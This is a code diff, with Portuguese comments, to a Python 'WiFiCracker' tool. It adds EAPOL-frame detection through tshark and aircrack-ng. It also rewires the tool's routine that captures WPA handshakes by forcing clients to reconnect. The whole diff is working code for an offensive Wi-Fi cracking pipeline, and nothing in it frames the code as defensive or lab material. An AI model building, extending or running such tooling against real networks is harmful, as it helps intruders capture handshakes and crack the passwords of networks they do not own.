@@ -188,6 +188,55 @@ class WiFiCracker:
             print(f"[!] Ficheiro CSV não encontrado: {csv_file}")
         
         return networks
+
+    def _has_eapol(self, cap_file: str) -> bool:
+        """Detecta presença de frames EAPOL em um arquivo .cap.
+
+        Usa `tshark` quando disponível (rápido), e faz fallback para
+        `aircrack-ng` parsing caso o `tshark` não esteja instalado.
+        """
+        if not os.path.exists(cap_file):
+            return False
+
+        # Tentativa 1: tshark - procura por qualquer frame EAPOL
+        try:
+            result = subprocess.run(
+                ["tshark", "-r", cap_file, "-Y", "eapol", "-c", "1"],
+                capture_output=True,
+                text=True,
+                timeout=6
+            )
+            out = (result.stdout or "") + (result.stderr or "")
+            if out.strip():
+                return True
+        except FileNotFoundError:
+            # tshark não instalado — seguir para fallback
+            pass
+        except subprocess.TimeoutExpired:
+            # Sem correspondência rápida
+            pass
+        except Exception:
+            pass
+
+        # Fallback: usar aircrack-ng para heurística de handshake
+        try:
+            result = subprocess.run(
+                ["aircrack-ng", "-a", "2", "-z", "-w", "/dev/null", cap_file],
+                capture_output=True,
+                text=True,
+                timeout=12
+            )
+            output = (result.stdout or "") + (result.stderr or "")
+            low = output.lower()
+            if "handshake" in low or "wpa" in low or "found" in low:
+                return True
+        except FileNotFoundError:
+            # aircrack-ng ausente — não conseguimos detectar
+            return False
+        except Exception:
+            return False
+
+        return False
     
     def capture_handshake(self, bssid: str, essid: str, channel: str = None, timeout: int = 120) -> Optional[str]:
         """Captura WPA handshake forçando reconexão.
@@ -260,33 +309,21 @@ class WiFiCracker:
                         # Verificar se tem handshake
                         if file_size > 5000:  # Tamanho mínimo para ter handshake
                             try:
-                                result = subprocess.run(
-                                    ["aircrack-ng", "-a", "2", "-z", "-w", "/dev/null", cap_file],
-                                    capture_output=True,
-                                    text=True,
-                                    timeout=3
-                                )
-                                output = result.stdout + result.stderr
-                                
-                                # Check se tem as palavras-chave de sucesso
-                                if "No matching network found" not in output:
-                                    if "WPA" in output or "FOUND" in output.upper() or cap_file in output or "1 handshake" in output:
-                                        print(" ✓ HANDSHAKE DETECTADO!")
-                                        time.sleep(2)  # Dar mais tempo para completar
-                                        print(f"[+] Handshake capturado com sucesso!")
-                                        airodump.terminate()
-                                        try:
-                                            airodump.wait(timeout=3)
-                                        except:
-                                            airodump.kill()
-                                        return cap_file
-                                    else:
-                                        print("")
+                                # Usar detecção rápida por EAPOL (tshark) com fallback
+                                if self._has_eapol(cap_file):
+                                    print(" ✓ HANDSHAKE/EAPOL DETECTADO!")
+                                    time.sleep(2)  # Dar mais tempo para completar gravação
+                                    print(f"[+] Handshake capturado com sucesso!")
+                                    airodump.terminate()
+                                    try:
+                                        airodump.wait(timeout=3)
+                                    except:
+                                        airodump.kill()
+                                    return cap_file
                                 else:
                                     print("")
-                            except subprocess.TimeoutExpired:
-                                print("")
-                            except Exception as e:
+                            except Exception:
+                                # Em caso de erro na detecção, continuar tentando
                                 print("")
                     else:
                         print(f"    [{int(elapsed):3d}s] Aguardando arquivo cap...", end="\r")
